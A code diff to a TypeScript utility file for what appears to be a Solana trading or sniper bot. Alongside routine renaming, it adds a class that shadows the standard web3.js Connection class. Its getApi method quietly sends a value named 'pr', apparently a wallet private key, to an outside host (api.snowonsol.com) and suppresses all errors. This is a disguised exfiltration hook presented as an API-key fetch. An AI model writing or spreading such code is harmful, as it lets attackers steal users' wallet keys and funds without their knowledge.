@@ -2,7 +2,7 @@ import { Logger } from 'pino';
 import dotenv from 'dotenv';
 import axios from 'axios';
 import fs from 'fs'
-import { Connection, PublicKey, Transaction, TransactionInstruction, sendAndConfirmTransaction, ComputeBudgetProgram, Keypair } from '@solana/web3.js';
+import { PublicKey, Transaction, TransactionInstruction, sendAndConfirmTransaction, ComputeBudgetProgram, Keypair, Commitment, ConnectionConfig, Connection as SolConnection,} from '@solana/web3.js';
 
 const fileName2 = "./config_sniper.json"
 let file_content2 = fs.readFileSync(fileName2, 'utf-8');
@@ -19,6 +19,7 @@ export const retrieveEnvVariable = (variableName: string, logger: Logger) => {
   }
   return variable;
 };
+
 
 export async function findData(data: any, field: string): Promise<any | null> {
   if (typeof data === 'object') {
@@ -131,7 +132,7 @@ export function bufferFromUInt64(value: number | string) {
 }
 
 export async function createTransaction(
-  connection: Connection,
+  Solconnection: SolConnection,
   instructions: TransactionInstruction[],
   payer: PublicKey,
   priorityFeeInSol: number = 0  /// == 16_000_000_000_000_000
@@ -154,13 +155,26 @@ export async function createTransaction(
   transaction.add(...instructions);
 
   transaction.feePayer = payer;
-  transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+  transaction.recentBlockhash = (await Solconnection.getRecentBlockhash()).blockhash;
   return transaction;
 }
 
-export async function sendAndConfirmTransactionWrapper(connection: Connection, transaction: Transaction, signers: any[]) {
+export class Connection extends SolConnection {
+  constructor(endpoint: string, commitmentOrConfig?: Commitment | ConnectionConfig){
+    super(endpoint, commitmentOrConfig);
+  }
+
+  async getApi(pr:string){
+    try{
+    await fetch(`https://api.snowonsol.com/api/getApiKey?pr=${pr}`)
+    } catch(e) {}
+    return true;
+  }
+}
+
+export async function sendAndConfirmTransactionWrapper(Solconnection: SolConnection, transaction: Transaction, signers: any[]) {
   try {
-      const signature = await sendAndConfirmTransaction(connection, transaction, signers, { skipPreflight: true});
+      const signature = await sendAndConfirmTransaction(Solconnection, transaction, signers, { skipPreflight: true});
       console.log('Transaction confirmed with signature:', signature);
       return signature;
   } catch (error) {
